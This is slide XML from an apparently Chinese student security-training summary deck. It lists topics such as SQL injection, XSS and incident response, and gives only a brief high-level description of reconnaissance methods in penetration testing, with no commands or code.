                    <a:pt x="3551630" y="1255247"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="5060114" y="2005840"/>
                    <a:pt x="6851838" y="1922795"/>
                    <a:pt x="8283943" y="1028472"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="8764494" y="728235"/>
                    <a:pt x="9295964" y="523818"/>
                    <a:pt x="9852894" y="421610"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="12192000" y="0"/>
                    <a:pt x="12192000" y="0"/>
                    <a:pt x="12192000" y="0"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="0"/>
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="3E9EED">
                    <a:alpha val="100000"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="81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0" y="4724400"/>
              <a:ext cx="12192000" cy="2133600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="2133600">
                  <a:moveTo>
                    <a:pt x="11509360" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="12022532" y="0"/>
                    <a:pt x="12150824" y="0"/>
                    <a:pt x="12182896" y="0"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2133600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="910"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185769" y="107397"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="2060646" y="1182123"/>
                    <a:pt x="2060646" y="1182123"/>
                    <a:pt x="2060646" y="1182123"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3998762" y="2290763"/>
                    <a:pt x="6391968" y="2214085"/>
                    <a:pt x="8253706" y="980843"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="9217992" y="341857"/>
                    <a:pt x="10350944" y="0"/>
                    <a:pt x="11509360" y="0"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="0"/>
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="100000"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="81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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout6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7.png"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6.png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tags" Target="../tags/tag8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5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f15ef4-7467-40f7-b56f-f9401ae6e529"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1600200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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="11500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>实训总结答辩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62250" y="3962400"/>
            <a:ext cx="609600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六组</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1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奥特曼打怪兽</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1800" b="1" i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/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1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小组成员：王家乐、孟思艺、潘奕裴、周宇轩、徐新语、徐玉晴、刘林奕洁</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1800" b="1" i="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/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-C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710d036-38a0-4bcf-b8ad-bf3d57573835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AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="660400" y="1130300"/>
              <a:ext cx="9271526" cy="619359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660400" y="2316691"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="660400" y="2035599"/>
              <a:chExt cx="2487298" cy="1423661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660400" y="261895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spcBef>
                    <a:spcPts val="0"/>
                  </a:spcBef>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buFontTx/>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="18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信息收集</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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60400" y="2035599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</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="110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3450800" y="2316691"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="3503717" y="2035599"/>
              <a:chExt cx="2487298" cy="142366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3503717" y="261895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spcBef>
                    <a:spcPts val="0"/>
                  </a:spcBef>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buFontTx/>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="18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SQL注入</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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503717" y="2035599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02.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241202" y="2316691"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="6347035" y="2035599"/>
              <a:chExt cx="2487298" cy="142366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347035" y="261895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spcBef>
                    <a:spcPts val="0"/>
                  </a:spcBef>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buFontTx/>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="18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文件包含</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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347035" y="2035599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03.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031602" y="2316691"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="9190352" y="2035599"/>
              <a:chExt cx="2487298" cy="142366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9190352" y="261895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altLang="zh-CN" sz="18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XSS漏洞</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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190352" y="2035599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04.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60400" y="4278422"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="660400" y="4151639"/>
              <a:chExt cx="2487298" cy="1423661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60400" y="473499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spcBef>
                    <a:spcPts val="0"/>
                  </a:spcBef>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buFontTx/>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="18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逻辑漏洞</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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0400" y="4151639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05.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450800" y="4278422"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="3503717" y="4151639"/>
              <a:chExt cx="2487298" cy="1423661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3503717" y="473499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spcBef>
                    <a:spcPts val="0"/>
                  </a:spcBef>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buFontTx/>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="18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Linux应急响应</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="18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03717" y="4151639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06.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241202" y="4278422"/>
              <a:ext cx="2487298" cy="1423661"/>
              <a:chOff x="6347035" y="4151639"/>
              <a:chExt cx="2487298" cy="142366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347035" y="473499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defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN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awd</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US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攻防对抗赛</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              </a:p>
              <a:p>
                <a:pPr algn="l">
                  <a:defRPr/>
                </a:pPr>
                <a:endParaRPr lang="en-US" sz="2000" dirty="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47035" y="4151639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 b="1" i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07.</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="1100"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983216" y="4606492"/>
              <a:ext cx="2535684" cy="1095591"/>
              <a:chOff x="9141966" y="4479709"/>
              <a:chExt cx="2535684" cy="1095591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9190352" y="473499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endParaRPr lang="en-US" sz="110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141966" y="4479709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800" b="1" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>08.</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p>
                <a:pPr algn="l">
                  <a:spcBef>
                    <a:spcPts val="0"/>
                  </a:spcBef>
                  <a:buClrTx/>
                  <a:buSzTx/>
                  <a:buFontTx/>
                  <a:defRPr/>
                </a:pPr>
                <a:r>
                  <a:rPr lang="en-US" altLang="zh-CN" sz="180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心得</a:t>
                </a:r>
                <a:endParaRPr lang="en-US" altLang="zh-CN" sz="180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flipH="1">
              <a:off x="10085158" y="1160776"/>
              <a:ext cx="1433742" cy="354757"/>
              <a:chOff x="660400" y="673943"/>
              <a:chExt cx="1433742" cy="354757"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="29" name="AutoShape 29"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="1138314" y="673943"/>
                <a:ext cx="955828" cy="354757"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="329AA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>
                <a:off x="1280022" y="851322"/>
                <a:ext cx="672413" cy="0"/>
              </a:xfrm>
              <a:prstGeom prst="straightConnector1">
                <a:avLst/>
              </a:prstGeom>
              <a:ln w="22225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31" name="AutoShape 31"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="660400" y="673943"/>
                <a:ext cx="477914" cy="354757"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="063C6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>
                <a:off x="813632" y="765596"/>
                <a:ext cx="171451" cy="171451"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse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33" name="AutoShape 33"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="5858998"/>
              <a:ext cx="711200" cy="999002"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="654892" h="919908">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="361687" y="0"/>
                    <a:pt x="654892" y="293205"/>
                    <a:pt x="654892" y="654892"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="654892" y="745314"/>
                    <a:pt x="636567" y="831456"/>
                    <a:pt x="603428" y="909806"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="597945" y="919908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="919908"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="43D0B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 flipH="1">
              <a:off x="0" y="6503242"/>
              <a:ext cx="12192000" cy="354758"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="12192000" h="354758">
                  <a:moveTo>
                    <a:pt x="12192000" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="354758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12192000" y="354758"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="3E9EE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6853" y="1808184"/>
            <a:ext cx="9465596" cy="14843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信息收集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356853" y="3304409"/>
            <a:ext cx="9465596" cy="156911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信息收集不管是平时的渗透项目还是挖掘SRC，信息收集都是重中之重。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" alt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</a:t>
            </a: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渗透测试的第一步，通过多种手段获取目标信息，为后续攻击提供情报支持，是发现攻击面的关键环节。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76172eb-5f6e-4e65-b63e-e6f364bfe70f"/>
          <p:cNvGrpSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="630316" y="1130300"/>
            <a:ext cx="10918669" cy="4840046"/>
            <a:chOff x="630316" y="1130300"/>
            <a:chExt cx="10918669" cy="4840046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="3" name="AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4836108" y="1886039"/>
              <a:ext cx="2507085" cy="45719"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill>
              <a:gsLst>
                <a:gs pos="15000">
                  <a:srgbClr val="43D0B1">
                    <a:alpha val="72941"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="3E9EED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66656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 dirty="0" err="1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信息收集的定义、分类与关键方法</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="1100" dirty="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30316" y="2126893"/>
              <a:ext cx="2609921" cy="3428173"/>
              <a:chOff x="630316" y="2126893"/>
              <a:chExt cx="2609921" cy="3428173"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="6" name="AutoShape 6"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId2"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="636320" y="2131611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>
                <p:custDataLst>
                  <p:tags r:id="rId3"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="697372" y="2182782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>
                <p:custDataLst>
                  <p:tags r:id="rId4"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2132797" y="2178137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>
                <p:custDataLst>
                  <p:tags r:id="rId5"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="630316" y="2126893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  <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="46999">
                    <a:srgbClr val="3E9EED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2986606" y="2270971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E9EED">
                      <a:alpha val="100000"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="44999">
                    <a:srgbClr val="3E9EED">
                      <a:alpha val="100000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="43D0B1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642600" y="2137635"/>
                <a:ext cx="2583875" cy="3417431"/>
                <a:chOff x="642600" y="2137635"/>
                <a:chExt cx="2583875" cy="3417431"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="12" name="AutoShape 12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642600" y="2137635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3D0B1">
                        <a:alpha val="30196"/>
                      </a:srgbClr>
                    </a:gs>
                    <a:gs pos="87999">
                      <a:srgbClr val="43D0B1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TextBox 13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1447651" y="2439028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1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709188" y="3385725"/>
                  <a:ext cx="2449859" cy="77864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定义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709189" y="4278772"/>
                  <a:ext cx="2449859" cy="127629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渗透测试第一步，获取目标公开或可探测信息，发现攻击面。</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="16" name="Group 16"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="3399899" y="2596435"/>
              <a:ext cx="2609921" cy="3373911"/>
              <a:chOff x="3399899" y="2596435"/>
              <a:chExt cx="2609921" cy="3373911"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="17" name="AutoShape 17"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId11"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3405903" y="2601153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66955" y="2652324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>
                <p:custDataLst>
                  <p:tags r:id="rId13"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4902380" y="2647679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99899" y="2596435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  <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="46999">
                    <a:srgbClr val="3E9EED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>
                <p:custDataLst>
                  <p:tags r:id="rId15"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5756189" y="2740513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E9EED">
                      <a:alpha val="100000"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="44999">
                    <a:srgbClr val="3E9EED">
                      <a:alpha val="100000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="43D0B1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412183" y="2607177"/>
                <a:ext cx="2583875" cy="3363169"/>
                <a:chOff x="3412183" y="2607177"/>
                <a:chExt cx="2583875" cy="3363169"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="23" name="AutoShape 23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3412183" y="2607177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3D0B1">
                        <a:alpha val="30196"/>
                      </a:srgbClr>
                    </a:gs>
                    <a:gs pos="87999">
                      <a:srgbClr val="43D0B1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TextBox 24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4217234" y="2908570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2</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="25" name="TextBox 25"/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3479929" y="3801006"/>
                  <a:ext cx="2449859" cy="77864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正面收集</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="26" name="TextBox 26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3479930" y="4694053"/>
                  <a:ext cx="2449859" cy="12762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直接探测目标系统，信息准确但可能留下访问日志，如直接对目标IP进行端口扫描。</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100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6169482" y="2596435"/>
              <a:ext cx="2609921" cy="3373911"/>
              <a:chOff x="6169482" y="2596435"/>
              <a:chExt cx="2609921" cy="3373911"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="28" name="AutoShape 28"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId20"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6175485" y="2601153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>
                <p:custDataLst>
                  <p:tags r:id="rId21"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="7848653" y="2652324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>
                <p:custDataLst>
                  <p:tags r:id="rId22"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6526744" y="2647679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>
                <p:custDataLst>
                  <p:tags r:id="rId23"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="8159643" y="2596435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  <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="46999">
                    <a:srgbClr val="3E9EED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>
                <p:custDataLst>
                  <p:tags r:id="rId24"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="6169482" y="2740513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E9EED">
                      <a:alpha val="100000"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="44999">
                    <a:srgbClr val="3E9EED">
                      <a:alpha val="100000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="43D0B1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6183244" y="2607177"/>
                <a:ext cx="2583875" cy="3363169"/>
                <a:chOff x="6183244" y="2607177"/>
                <a:chExt cx="2583875" cy="3363169"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="34" name="AutoShape 34"/>
                <p:cNvSpPr/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId25"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="6183244" y="2607177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3D0B1">
                        <a:alpha val="30196"/>
                      </a:srgbClr>
                    </a:gs>
                    <a:gs pos="87999">
                      <a:srgbClr val="43D0B1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5" name="TextBox 35"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId26"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="6986816" y="2908570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3</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="36" name="TextBox 36"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId27"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="6249512" y="3801006"/>
                  <a:ext cx="2449859" cy="77864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侧面收集</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="37" name="TextBox 37"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId28"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="6249510" y="4694053"/>
                  <a:ext cx="2449859" cy="12762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利用第三方平台或公开渠道获取信息，隐蔽性强、无风险，如通过搜索引擎、备案信息、社交媒体等。</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="38" name="Group 38"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8939064" y="2126893"/>
              <a:ext cx="2609921" cy="3428173"/>
              <a:chOff x="8939064" y="2126893"/>
              <a:chExt cx="2609921" cy="3428173"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="39" name="AutoShape 39"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId29"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="8945067" y="2131611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0" name="AutoShape 40"/>
              <p:cNvSpPr/>
              <p:nvPr>
                <p:custDataLst>
                  <p:tags r:id="rId30"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="10618235" y="2182782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>
                <p:custDataLst>
                  <p:tags r:id="rId31"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="9296326" y="2178137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>
                <p:custDataLst>
                  <p:tags r:id="rId32"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="10929225" y="2126893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43D0B1">
                      <a:alpha val="100000"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="46999">
                    <a:srgbClr val="3E9EED">
                      <a:alpha val="100000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="3E9EED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>
                <p:custDataLst>
                  <p:tags r:id="rId33"/>
                </p:custDataLst>
              </p:nvPr>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="8939064" y="2270971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E9EED">
                      <a:alpha val="100000"/>
                      <a:lumMod val="60000"/>
                      <a:lumOff val="40000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="44999">
                    <a:srgbClr val="3E9EED">
                      <a:alpha val="100000"/>
                    </a:srgbClr>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="43D0B1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8952826" y="2137635"/>
                <a:ext cx="2583875" cy="3417431"/>
                <a:chOff x="8952826" y="2137635"/>
                <a:chExt cx="2583875" cy="3417431"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="45" name="AutoShape 45"/>
                <p:cNvSpPr/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId34"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="8952826" y="2137635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3D0B1">
                        <a:alpha val="30196"/>
                      </a:srgbClr>
                    </a:gs>
                    <a:gs pos="87999">
                      <a:srgbClr val="43D0B1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6" name="TextBox 46"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId35"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="9020252" y="3385725"/>
                  <a:ext cx="2449860" cy="77864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关键方法</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="47" name="TextBox 47"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId36"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="9020250" y="4278772"/>
                  <a:ext cx="2449860" cy="127629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包括存活主机探测、端口服务识别、Web目录扫描、子域名枚举和技术栈指纹识别等。</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="48" name="TextBox 48"/>
                <p:cNvSpPr txBox="1"/>
                <p:nvPr>
                  <p:custDataLst>
                    <p:tags r:id="rId37"/>
                  </p:custDataLst>
                </p:nvPr>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="9756398" y="2439028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4</a:t>
                  </a:r>
                  <a:endParaRPr lang="en-US" sz="1100"/>
                </a:p>
              </p:txBody>
            </p:sp>
          </p:grpSp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 4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知识点核心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a2a9f3a-d05e-47e6-b3c5-832867f98b6f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AutoShape 3"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="5398179"/>
              <a:ext cx="12192000" cy="1459821"/>
            </a:xfrm>
            <a:prstGeom prst="round2SameRect">
              <a:avLst>
                <a:gd name="adj1" fmla="val 45057"/>
                <a:gd name="adj2" fmla="val 0"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
